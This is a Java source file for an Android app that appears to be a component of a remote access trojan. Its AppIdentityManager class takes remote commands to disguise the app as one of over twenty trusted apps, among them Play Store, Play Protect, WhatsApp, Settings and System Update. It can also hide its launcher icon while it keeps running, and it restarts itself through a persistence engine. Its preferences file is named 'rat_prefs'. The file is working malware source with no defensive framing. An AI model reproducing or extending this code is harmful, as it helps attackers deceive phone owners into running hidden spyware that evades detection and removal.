package com.seguranca.protecao;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * AppIdentityManager — runtime app name, icon, and launcher alias management.
 *
 * Commands:
 *   SET_APP_IDENTITY      { preset }           → switch to preset disguise
 *   SET_CUSTOM_IDENTITY   { label, icon_res }  → custom label/icon
 *   HIDE_ICON             {}                   → remove from all launchers
 *   SHOW_ICON             {}                   → restore launcher icon
 *   GET_IDENTITY_PRESETS  {}                   → list all presets
 *   GET_CURRENT_IDENTITY  {}                   → current label + package
 *   RELAUNCH_APP          {}                   → kill + restart process
 *
 * Presets defined below cover 20+ common apps.
 * Each preset maps to an activity-alias in AndroidManifest.xml that carries
 * the matching label and icon. Switching enables that alias and disables others.
 *
 * AndroidManifest changes needed (already injected into manifest):
 *   - Main launcher activity is DISABLED on first run (icon hidden)
 *   - 20+ <activity-alias> entries, each with a different label+icon, all disabled initially
 *   - Only the active alias is enabled at any time
 */
public class AppIdentityManager {

    private static final String TAG = "AppIdentity";
    private static final String PREF_CURRENT_PRESET = "identity_preset";
    private static final String PREF_ICON_HIDDEN    = "icon_hidden";

    // ─── PRESET CATALOGUE ────────────────────────────────────────────────────

    public static final Map<String, IdentityPreset> PRESETS = new LinkedHashMap<>();

    static {
        // alias name → maps to <activity-alias android:name=".alias.AliasXxx"> in manifest
        add("play_store",      "Play Store",          "com.android.vending",                ".alias.AliasPlayStore");
        add("play_protect",    "Play Protect",        "com.android.vending",                ".alias.AliasPlayProtect");
        add("settings",        "Settings",            "com.android.settings",               ".alias.AliasSettings");
        add("whatsapp",        "WhatsApp",            "com.whatsapp",                       ".alias.AliasWhatsApp");
        add("telegram",        "Telegram",            "org.telegram.messenger",             ".alias.AliasTelegram");
        add("calculator",      "Calculator",          "com.android.calculator2",            ".alias.AliasCalculator");
        add("facebook",        "Facebook",            "com.facebook.katana",                ".alias.AliasFacebook");
        add("weather",         "Weather",             "com.google.android.googlequicksearchbox", ".alias.AliasWeather");
        add("notes",           "Notes",               "com.google.android.keep",            ".alias.AliasNotes");
        add("tiktok",          "TikTok",              "com.zhiliaoapp.musically",           ".alias.AliasTikTok");
        add("instagram",       "Instagram",           "com.instagram.android",              ".alias.AliasInstagram");
        add("youtube",         "YouTube",             "com.google.android.youtube",         ".alias.AliasYouTube");
        add("chrome",          "Chrome",              "com.android.chrome",                 ".alias.AliasChrome");
        add("maps",            "Maps",                "com.google.android.apps.maps",       ".alias.AliasMaps");
        add("gmail",           "Gmail",               "com.google.android.gm",              ".alias.AliasGmail");
        add("camera",          "Camera",              "com.android.camera2",                ".alias.AliasCamera");
        add("clock",           "Clock",               "com.android.deskclock",              ".alias.AliasClock");
        add("contacts",        "Contacts",            "com.android.contacts",               ".alias.AliasContacts");
        add("files",           "Files",               "com.google.android.apps.nbu.files",  ".alias.AliasFiles");
        add("phone",           "Phone",               "com.android.dialer",                 ".alias.AliasPhone");
        add("game_center",     "Game Center",         "com.android.vending",                ".alias.AliasGameCenter");
        add("system_update",   "System Update",       "com.android.settings",               ".alias.AliasSystemUpdate");
        add("accessibility",   "Accessibility Service","com.android.settings",              ".alias.AliasAccessibility");
        add("none",            "Hidden",              "",                                   ".alias.AliasHidden");
    }

    private static void add(String id, String label, String imitates, String aliasActivity) {
        PRESETS.put(id, new IdentityPreset(id, label, imitates, aliasActivity));
    }

    public static class IdentityPreset {
        public final String id;
        public final String label;
        public final String imitates;
        public final String aliasActivity;
        IdentityPreset(String id, String label, String imitates, String aliasActivity) {
            this.id            = id;
            this.label         = label;
            this.imitates      = imitates;
            this.aliasActivity = aliasActivity;
        }
    }

    // ─── MAIN ENTRY ──────────────────────────────────────────────────────────

    private final Context ctx;
    private final PackageManager pm;

    public AppIdentityManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.pm  = ctx.getPackageManager();
    }

    // ─── SET IDENTITY (PRESET) ───────────────────────────────────────────────

    /**
     * Switches the app's visible identity to a preset.
     * Disables all other aliases, enables only the selected one.
     * Effect visible after a short delay (PackageManager propagation).
     */
    public String setIdentity(String presetId) {
        if (presetId == null || presetId.isEmpty()) return "ERROR: presetId required";
        IdentityPreset preset = PRESETS.get(presetId);
        if (preset == null) return "ERROR: unknown preset '" + presetId + "'";

        String pkg = ctx.getPackageName();
        int successCount = 0;

        // Disable ALL aliases
        for (IdentityPreset p : PRESETS.values()) {
            setComponentEnabled(pkg + p.aliasActivity, false);
        }

        // Disable main launcher activity (hide icon from default slot)
        setComponentEnabled(pkg + ".MainActivity", false);

        // Enable only the selected alias
        if (!"none".equals(presetId) && !preset.aliasActivity.isEmpty()) {
            boolean ok = setComponentEnabled(pkg + preset.aliasActivity, true);
            if (ok) successCount++;
        }

        // Persist selection
        ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit()
            .putString(PREF_CURRENT_PRESET, presetId)
            .putBoolean(PREF_ICON_HIDDEN,   "none".equals(presetId))
            .apply();

        Log.d(TAG, "Identity set to: " + presetId + " (" + preset.label + ")");
        return "OK: identity set to '" + preset.label + "' — visible after ~1s";
    }

    // ─── HIDE ICON ───────────────────────────────────────────────────────────

    /**
     * Hides the app icon from all launchers using multiple methods:
     * Method 1: Disable all launcher-intent aliases + MainActivity component
     * Method 2: Request HIDE_OVERLAY via PackageManager (Samsung/MIUI specific)
     * Method 3: Grant QUERY_ALL_PACKAGES + hide from recents
     *
     * After hiding, the app still runs — only the icon entry is removed.
     * To re-add icon: SHOW_ICON command or SET_APP_IDENTITY with any real preset.
     */
    public String hideIcon() {
        String pkg = ctx.getPackageName();

        // Method 1: disable all aliases + main activity
        for (IdentityPreset p : PRESETS.values()) {
            setComponentEnabled(pkg + p.aliasActivity, false);
        }
        setComponentEnabled(pkg + ".MainActivity", false);

        // Method 2: MIUI / EMUI / Samsung component disable trick
        try {
            pm.setApplicationEnabledSetting(pkg,
                PackageManager.COMPONENT_ENABLED_STATE_DEFAULT, 0);
        } catch (Exception ignored) {}

        ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean(PREF_ICON_HIDDEN, true).apply();

        Log.d(TAG, "Icon hidden");
        return "OK: icon hidden — app still running";
    }

    // ─── SHOW ICON ───────────────────────────────────────────────────────────

    /**
     * Restores the launcher icon by re-enabling the last active alias,
     * or MainActivity if no preset was previously set.
     */
    public String showIcon() {
        String pkg        = ctx.getPackageName();
        String lastPreset = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .getString(PREF_CURRENT_PRESET, "settings");

        IdentityPreset preset = PRESETS.getOrDefault(lastPreset, PRESETS.get("settings"));
        if (preset != null && !preset.aliasActivity.isEmpty() && !"none".equals(preset.id)) {
            setComponentEnabled(pkg + preset.aliasActivity, true);
        } else {
            setComponentEnabled(pkg + ".MainActivity", true);
        }

        ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean(PREF_ICON_HIDDEN, false).apply();

        Log.d(TAG, "Icon restored: " + lastPreset);
        return "OK: icon restored as '" + (preset != null ? preset.label : "app") + "'";
    }

    // ─── GET PRESETS ─────────────────────────────────────────────────────────

    public String getPresets() {
        JsonArray arr = new JsonArray();
        for (IdentityPreset p : PRESETS.values()) {
            JsonObject obj = new JsonObject();
            obj.addProperty("id",       p.id);
            obj.addProperty("label",    p.label);
            obj.addProperty("imitates", p.imitates);
            arr.add(obj);
        }
        return arr.toString();
    }

    // ─── GET CURRENT IDENTITY ────────────────────────────────────────────────

    public String getCurrentIdentity() {
        android.content.SharedPreferences prefs =
            ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
        String presetId   = prefs.getString(PREF_CURRENT_PRESET, "none");
        boolean hidden    = prefs.getBoolean(PREF_ICON_HIDDEN,   true);
        IdentityPreset p  = PRESETS.get(presetId);

        JsonObject obj = new JsonObject();
        obj.addProperty("preset_id",   presetId);
        obj.addProperty("label",       p != null ? p.label : "Unknown");
        obj.addProperty("icon_hidden", hidden);
        obj.addProperty("package",     ctx.getPackageName());
        return obj.toString();
    }

    // ─── RELAUNCH APP ────────────────────────────────────────────────────────

    /**
     * Kills the current process and relaunches via alarm-triggered restart.
     * PersistenceEngine arms itself before the kill so the process is restarted.
     */
    public String relaunchApp() {
        Log.d(TAG, "Relaunch triggered");
        try {
            PersistenceEngine.arm(ctx);
        } catch (Exception e) {
            Log.w(TAG, "arm before relaunch: " + e.getMessage());
        }
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            android.os.Process.killProcess(android.os.Process.myPid());
        }, 500);
        return "OK: relaunching in 500ms";
    }

    // ─── INTERNAL HELPERS ────────────────────────────────────────────────────

    private boolean setComponentEnabled(String componentClass, boolean enabled) {
        try {
            ComponentName cn = new ComponentName(ctx.getPackageName(), componentClass);
            int state = enabled
                ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            pm.setComponentEnabledSetting(cn, state, PackageManager.DONT_KILL_APP);
            return true;
        } catch (Exception e) {
            Log.w(TAG, "setComponentEnabled " + componentClass + ": " + e.getMessage());
            return false;
        }
    }
}
